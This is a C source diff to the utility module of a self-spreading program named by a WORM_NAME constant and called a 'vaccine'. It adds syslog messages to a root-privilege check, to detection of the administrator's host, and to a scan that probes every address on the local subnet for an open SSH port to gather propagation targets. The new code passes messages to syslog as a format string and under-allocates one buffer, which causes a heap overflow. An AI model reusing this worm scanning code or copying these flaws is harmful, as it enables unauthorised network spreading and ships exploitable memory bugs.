@@ -1,10 +1,18 @@
 #include "../include/utils.h"
 
+void writeSyslog(char *msg) {
+	openlog(WORM_NAME, LOG_PID | LOG_CONS, LOG_USER);
+	syslog(LOG_INFO, msg);
+	closelog();
+}
+
 int isRoot() {
 	int ret = 0;
 
-	if (getuid() == 0 && geteuid() == 0)
+	if (getuid() == 0 && geteuid() == 0) {
+		writeSyslog("## Launching vaccine by root.");
 		ret = 1;
+	}
 	return ret;
 }
 
@@ -72,7 +80,8 @@ int isSourceHost(char *source_host_ip, char *mask_network) {
 					inet_ntop(ifa->ifa_netmask->sa_family, (void *) &(mask->sin_addr), buf, sizeof(buf));
 					memset(mask_network, 0, IP_LEN);
 					strcpy(mask_network, buf);
-
+					
+					writeSyslog("## We are the administrator's host.");
 					ret = 1;
 					break;
 				}
@@ -89,18 +98,38 @@ struct in_addr* scanNetwork(char* source_host_ip, char* mask_network) {
 	struct sockaddr_in sockHostIP;
 	unsigned long int nbrComputer, hostMask, i;
 	int sock, compteur = 0;
+	char nbrComputer_[80];
+	char *syslog_ = NULL;
 
+	writeSyslog("## Launching network scan.");
 	inet_aton(source_host_ip, &sourceIP);
 	inet_aton(mask_network, &mask);
 	inet_aton(BROADCAST, &broadcast);
 	nbrComputer = ntohl(broadcast.s_addr ^ mask.s_addr);
 	hostMask = sourceIP.s_addr & mask.s_addr;
+	
+	sprintf(nbrComputer_, "%lu", nbrComputer);
+	syslog_ = (char *) malloc(strlen("## Maximal number of hosts on this network : ") + strlen(nbrComputer_) + 1);
+	if (syslog_ != NULL) {
+		strcpy(syslog_, "## Maximal number of hosts on this network : ");
+		strcat(syslog_, nbrComputer_);
+		writeSyslog(syslog_);
+		free(syslog_);
+	}
 
 	for (i = 1; i < nbrComputer; i++) {
 		hostIP.s_addr = htonl(ntohl(hostMask) + i);
 
-		if (strcmp(inet_ntoa(hostIP), source_host_ip) == 0)
+		if (strcmp(inet_ntoa(hostIP), source_host_ip) == 0) {
+			syslog_ = (char *) malloc(strlen(source_host_ip) + strlen("## Host administrator found : "));
+			if (syslog_ != NULL) {
+				strcpy(syslog_, "## Host administrator found : ");
+				strcat(syslog_, source_host_ip);
+				writeSyslog(syslog_);
+				free(syslog_);
+			}
 			continue;
+		}
 
 		bzero(&sockHostIP, sizeof(sockHostIP));
 		sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -109,13 +138,27 @@ struct in_addr* scanNetwork(char* source_host_ip, char* mask_network) {
 		sockHostIP.sin_addr = hostIP;
 
 		if (connect(sock, (struct sockaddr *) & sockHostIP, sizeof(sockHostIP)) == 0) {
-			printf("scanning port %d on %s : open\n", PORT, inet_ntoa(sockHostIP.sin_addr));
 			resultIP = (struct in_addr *) realloc(resultIP, (compteur + 1) * sizeof(struct in_addr));
 			resultIP[compteur] = hostIP;
 			compteur++;
+			syslog_ = (char *) malloc(strlen(inet_ntoa(sockHostIP.sin_addr)) + strlen(" tested and ssh port is open") + 4);
+			if (syslog_ != NULL) {
+				strcpy(syslog_, "## ");
+				strcat(syslog_, inet_ntoa(sockHostIP.sin_addr));
+				strcat(syslog_, " tested and ssh port is open");
+				writeSyslog(syslog_);
+				free(syslog_);
+			}
 		}
 		else {
-			printf("scanning port %d on %s : close\n", PORT, inet_ntoa(sockHostIP.sin_addr));
+			syslog_ = (char *) malloc(strlen(inet_ntoa(sockHostIP.sin_addr)) + strlen(" tested") + 4);
+			if (syslog_ != NULL) {
+				strcpy(syslog_, "## ");
+				strcat(syslog_, inet_ntoa(sockHostIP.sin_addr));
+				strcat(syslog_, " tested");
+				writeSyslog(syslog_);
+				free(syslog_);
+			}
 			continue;
 		}
 	}
